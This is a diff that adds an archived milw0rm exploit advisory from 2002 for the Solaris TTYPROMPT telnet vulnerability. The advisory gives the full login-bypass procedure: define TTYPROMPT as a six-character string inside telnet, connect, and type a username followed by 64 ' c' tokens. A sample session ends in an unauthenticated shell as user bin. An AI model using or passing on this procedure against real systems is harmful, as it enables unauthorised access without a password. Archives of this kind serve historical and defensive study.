@@ -1,0 +1,26 @@
+Solaris TTYPROMPT Security Vulnerability (Telnet)
+
+This vulnerability is very simple to exploit, since it does not require 
+any code to be compiled by an attacker. The vulnerability only requires 
+the attacker to simply define the environment variable TTYPROMPT to a 
+6-character string, inside telnet. Jonathan believes this overflows an 
+integer inside login, which specifies whether the user has been 
+authenticated (just a guess).
+
+Once connected to the remote host, you must type the username, followed 
+by 64 " c"s, and a literal "\n". You will then be logged in as the user 
+without any password authentication. This should work with any account 
+except root (unless remote root login is allowed). 
+
+Example: 
+coma% telnet 
+telnet> environ define TTYPROMPT abcdef 
+telnet> o localhost 
+
+SunOS 5.8 
+
+bin c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c\n 
+Last login: whenever 
+$ whoami bin 
+
+# milw0rm.com [2002-11-02]
